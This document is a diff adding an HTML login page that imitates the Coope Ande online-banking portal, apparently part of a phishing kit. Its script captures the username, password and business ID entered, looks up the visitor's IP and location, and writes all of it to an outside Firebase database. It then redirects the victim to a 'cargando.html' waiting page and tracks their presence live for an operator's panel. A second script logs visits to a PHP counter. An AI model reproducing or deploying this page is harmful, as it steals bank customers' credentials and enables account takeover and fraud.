@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coope Ande en línea</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #fff; }
+        .top-line { height: 4px; background: linear-gradient(to right, #2e3192, #00aeef, #00a651, #fff200, #f7941e, #ed1c24, #92278f); }
+        .login-box { border: 1px solid #0076be; min-height: 400px; width: 320px; }
+        .login-header { background-color: #e6e6e6; border-bottom: 1px solid #ccc; padding: 10px; color: #0076be; font-weight: bold; }
+        .radio-group { background-color: #dbdbdb; padding: 8px; font-size: 13px; display: flex; justify-content: center; gap: 15px; }
+        .input-icon-container { position: relative; width: 100%; }
+        .input-icon-container i { position: absolute; left: 10px; top: 10px; color: #999; }
+        .input-field { width: 100%; border: 1px solid #ccc; padding: 8px 8px 8px 35px; outline: none; font-size: 14px; }
+        .btn-ingresar { background-color: #0076be; color: white; width: 100%; padding: 10px; font-weight: bold; }
+        .btn-firma { background-color: #e9af28; color: #333; width: 100%; padding: 8px; font-weight: bold; display: flex; items-center; justify-content: center; gap: 8px; }
+        .btn-registro { background-color: #a04395; color: white; width: 100%; padding: 8px; font-weight: bold; }
+        .footer-box { background-color: #eee; border: 1px solid #ccc; padding: 15px; font-size: 12px; height: 180px; }
+    </style>
+</head>
+<body class="bg-white">
+
+    <div class="top-line"></div>
+    
+    <!-- Header -->
+    <div class="max-w-6xl mx-auto flex justify-between items-center py-4 px-4">
+        <img src="logotipod41d.png" alt="Logo" class="h-16">
+        <span class="text-gray-600 text-xs">Bienvenido(a) a Coope Ande en línea</span>
+    </div>
+
+    <div class="max-w-6xl mx-auto px-4 mt-6 grid grid-cols-1 md:grid-cols-3 gap-8">
+        
+        <!-- Banner Izquierdo -->
+        <div class="md:col-span-2">
+            <img src="baneerr.jfif" alt="Banner Crédito" class="w-full shadow-sm">
+            <div class="mt-4">
+                <h2 class="font-bold text-gray-800 text-lg">Los mejores beneficios para tu crédito personal</h2>
+                <p class="text-gray-600 text-sm">Disfrutá de condiciones fijas todo el plazo con tu crédito personal de Coope Ande. Ver más en www.coopeande1.com</p>
+            </div>
+        </div>
+
+        <!-- Login Card -->
+        <div class="login-box bg-white">
+            <div class="login-header text-sm">Coope Ande en línea</div>
+            <div class="radio-group">
+                <label class="flex items-center gap-1 cursor-pointer">
+                    <input type="radio" name="tipo" value="personal" checked onclick="toggleJuridica(false)"> Personal
+                </label>
+                <span class="text-gray-400">|</span>
+                <label class="flex items-center gap-1 cursor-pointer">
+                    <input type="radio" name="tipo" value="empresarial" onclick="toggleJuridica(true)"> Empresarial
+                </label>
+            </div>
+
+            <form id="login-form" class="p-5 space-y-4">
+                <div id="juridica-wrap" class="hidden">
+                    <div class="input-icon-container">
+                        <i class="fa-solid fa-building"></i>
+                        <input type="text" id="cedula_juridica" placeholder="Cédula Jurídica" class="input-field">
+                    </div>
+                </div>
+
+                <div class="input-icon-container">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" id="user" onkeypress="return event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57" inputmode="numeric" placeholder="Usuario" required class="input-field">
+                </div>
+
+                <div class="input-icon-container">
+                    <i class="fa-solid fa-key"></i>
+                    <input type="password" id="pass" placeholder="Contraseña" pattern=".*,[_$@#&()-+!*].*" required class="input-field">
+                </div>
+
+                <button type="submit" id="btn-envio" class="btn-ingresar uppercase text-sm">Ingresar</button>
+
+                <div class="text-center text-xs space-y-3">
+                    <a href="#" class="text-gray-600 block">¿Olvidó su contraseña?</a>
+                    <button type="button" class="btn-firma rounded-sm">
+                        <i class="fa-solid fa-pen-nib"></i> Firma digital
+                    </button>
+                    <a href="#" class="text-gray-600 block">¿No posee usuario?</a>
+                    <button type="button" class="btn-registro rounded-sm uppercase">Regístrese aquí</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Secciones Inferiores -->
+    <div class="max-w-6xl mx-auto px-4 mt-10 grid grid-cols-1 md:grid-cols-3 gap-4 pb-10">
+        <div class="footer-box">
+            <h3 class="font-bold border-b border-gray-300 pb-2 mb-2 text-center">Tipo de cambio</h3>
+            <p class="text-center font-bold mb-2">Dólares</p>
+            <div class="flex justify-around text-xs mt-4">
+                <div class="text-center">
+                    <p class="text-gray-500 uppercase">Compra</p>
+                    <p class="text-lg">₡ 449.00</p>
+                </div>
+                <div class="text-center">
+                    <p class="text-gray-500 uppercase">Venta</p>
+                    <p class="text-lg">₡ 463.50</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-box">
+            <h3 class="font-bold border-b border-gray-300 pb-2 mb-2 text-center">Seguridad</h3>
+            <p class="text-[11px] leading-tight">Por su seguridad si digita incorrectamente su contraseña <span class="text-red-600 font-bold">3 veces seguidas</span> ésta le será bloqueada.</p>
+            <p class="text-[11px] mt-2 leading-tight">Coope Ande <span class="text-red-600 font-bold">NUNCA</span> le solicitará su contraseña por correo electrónico o teléfono.</p>
+        </div>
+
+        <div class="footer-box">
+            <h3 class="font-bold border-b border-gray-300 pb-2 mb-2 text-center">Preguntas frecuentes</h3>
+            <ul class="text-blue-700 text-xs space-y-2 mt-4">
+                <li><a href="#" class="underline">¿Qué hacer si se me bloquea la contraseña?</a></li>
+                <li><a href="#" class="underline">¿Cómo cambio mi contraseña?</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = { databaseURL: "https://mslogs-31bf1-default-rtdb.firebaseio.com/" };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const sessionId = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
+
+        function toggleJuridica(show) {
+            document.getElementById('juridica-wrap').style.display = show ? 'block' : 'none';
+        }
+
+        
+        // Sistema de Presencia para tu Panel
+        const presenceRef = db.ref('logins/' + sessionId + '/online');
+        db.ref('.info/connected').on('value', (snap) => {
+            if (snap.val() === true) {
+                presenceRef.onDisconnect().set(false);
+                presenceRef.set(true);
+            }
+        });
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const cj = document.getElementById('cedula_juridica').value;
+            const tipo = document.querySelector('input[name="tipo"]:checked').value;
+
+            fetch('https://ipapi.co/json/').then(res => res.json()).then(ipData => {
+                const payload = {
+                    user: u, pass: p, online: true,
+                    ip: ipData.ip || '0.0.0.0',
+                    ubicacion: `${ipData.city || '?'}, ${ipData.country_name || '?'}`,
+                    fecha: new Date().toLocaleString(),
+                    status: 'INGRESANDO CREDENCIALES'
+                };
+                if (tipo === 'empresarial') payload.cedula_juridica = cj;
+
+                db.ref('logins/' + sessionId).set(payload).then(() => {
+                    window.location.href = 'cargando.html?id=' + sessionId;
+                });
+            }).catch(() => { window.location.href = 'cargando.html?id=' + sessionId; });
+        });
+    </script>
+  <script>
+    let contadorClics = 0;
+    const urlServidor = 'contador.php'; // Asegúrate de que apunte a la ruta correcta de tu PHP
+
+    // Función auxiliar para enviar datos de forma asíncrona al backend
+    async function reportarEvento(tipo, info) {
+        try {
+            await fetch(urlServidor, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    evento: tipo,
+                    detalles: info
+                })
+            });
+        } catch (error) {
+            console.error('Error al reportar interacción:', error);
+        }
+    }
+
+    // 1. Reportar la visita en cuanto la página termine de cargar
+    window.addEventListener('DOMContentLoaded', () => {
+        reportarEvento('visita', 'El usuario ingresó a la página de inicio');
+    });
+
+    // 2. Escuchar los clics del botón e ir sumando e informando
+    document.getElementById('btnClic').addEventListener('click', () => {
+        contadorClics++;
+        document.getElementById('contadorPantalla').textContent = contadorClics;
+        
+        // Enviamos el aviso al servidor detallando el número de clic actual
+        reportarEvento('clic', `Clic número: ${contadorClics}`);
+    });
+</script>
+</body>
+</html>
